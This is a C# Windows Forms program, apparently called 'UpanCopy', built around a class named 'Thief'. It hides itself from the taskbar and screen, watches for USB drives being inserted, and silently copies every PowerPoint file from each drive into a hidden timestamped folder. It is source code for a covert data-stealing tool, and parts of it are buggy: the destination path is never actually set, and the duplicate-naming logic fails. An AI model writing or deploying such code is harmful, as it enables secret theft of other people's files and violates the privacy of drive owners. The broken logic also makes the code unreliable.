using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Security.AccessControl;

namespace UpanCopy
{
    public partial class Form1 : Form  //表层函数
    {
        public Form1()
        {
            InitializeComponent();
            //this.Visible = false;
            ShowInTaskbar = false;    //不在任务栏中显示
            WindowState = FormWindowState.Minimized; //最小化
        }

        Thread thread = null;                  //新建线程                    
        Thief thief1 = new Thief();

        protected override void WndProc(ref Message m)  //主函数
        {
            const int WM_DEVICECHANGE = 0x219;
            const int DBT_DEVICEARRIVAL = 0x8000;
            const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
            if (m.Msg == WM_DEVICECHANGE)
            {
                switch (m.WParam.ToInt32())
                {
                    // case WM_DEVICECHANGE:
                    //     break;
                    case DBT_DEVICEARRIVAL:
                        {
                            thread = null;
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                if (drive.DriveType == DriveType.Removable)
                                {
                                    statusBox.Text = "--> U盘已插入，盘符为:" + drive.Name.ToString();
                                    thief1.Setdrivestr(drive.Name);
                                    thief1.MakeDir();
                                    thread = new Thread(new ThreadStart(thief1.Copy));//线程实例化
                                    thread.Start();//启动线程
                                }
                            }
                            break;
                        }
                    case DBT_DEVICEREMOVECOMPLETE:
                        {
                            statusBox.Text = "U盘拔出";
                            thread = null;
                            break;
                        }
                }
            }
            base.WndProc(ref m);
        }

        private void Button_Search_Click(object sender, EventArgs e) //浏览
        {
            folderBrowserDialog1.ShowDialog();
            addressBox.Text = folderBrowserDialog1.SelectedPath;
            thief1.Setdes(addressBox.Text);
        }

        private void Button_Hide_Click_1(object sender, EventArgs e) //隐藏
        {
            //if (des != "")
            Hide();  //后台运行程序
                     //else
                     //    MessageBox.Show("请选择文件存放位置....", "信息", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    }

    public class Thief
    {
        private string drivestr;
        private string des = @"D:\UFD";
        string spath;

        public void Setdes(string path)
        {
            des = path;
        }

        public void Setdrivestr(string path)
        {
            drivestr = path;
        }

        public void Copy()
        {
            CopyFile(drivestr, spath);
        }

        public void CopyFile(string path, string spath) //Copy Function
        {
            DirectoryInfo dir = new DirectoryInfo(path);

            foreach (DirectoryInfo DI in dir.GetDirectories())  //Directory Files
            {
                try
                {
                    CopyFile(DI.FullName, spath);
                }
                catch (UnauthorizedAccessException)
                {
                    continue;
                }
            }

            foreach (FileInfo FI in dir.GetFiles())  //Foreach Files
            {
                //if (FI.Length <= filesize * 1024 * 1024)
                if (FI.Extension == ".ppt" || FI.Extension == ".pptx")
                {
                    try
                    {
                        string des = spath + "\\";
                        if (File.Exists(spath + FI.Name) == true)
                        {
                            int i = 1;
                            bool a = CalculateHash(FI.FullName, des + FI.Name);
                            if (a != true)
                            {
                                File.Copy(FI.FullName, des + i + FI.Name);
                                i++;
                            }
                        }
                        else
                        {
                            File.Copy(FI.FullName, des + FI.Name);
                        }
                    }
                    catch (IOException) { continue; }
                }
            }
        }

        public void MakeDir()
        {
            string spath = des + "\\" + DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss");
            if (Directory.Exists(spath) == false)
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(spath);
                directoryInfo.Create();
            }
        }

        public bool CalculateHash(string file1, string file2)
        {
            //First File
            var hash = System.Security.Cryptography.HashAlgorithm.Create();
            var stream_1 = new FileStream(file1, FileMode.Open);
            byte[] hashByte_1 = hash.ComputeHash(stream_1);
            stream_1.Close();

            //Second File
            var stream_2 = new FileStream(file2, FileMode.Open);
            byte[] hashByte_2 = hash.ComputeHash(stream_2);
            stream_2.Close();

            //Compare
            if (BitConverter.ToString(hashByte_1) == BitConverter.ToString(hashByte_2))
                return true;
            else
                return false;
        }
    }
}